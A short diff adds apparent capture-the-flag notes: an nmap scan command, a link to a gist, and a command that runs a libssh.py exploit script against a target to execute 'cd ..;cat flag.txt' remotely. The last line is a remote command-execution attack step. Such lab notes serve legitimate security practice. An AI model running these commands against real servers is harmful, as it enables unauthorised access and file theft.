@@ -1,0 +1,4 @@
+$nmap –sV –sC –p port ip -Pn
+https://gist.github.com/mgeeky/a7271536b1d815acfb8060fd8b65bd5d
+python3 libssh.py ip -p port -c "cd ..;cat flag.txt"
+
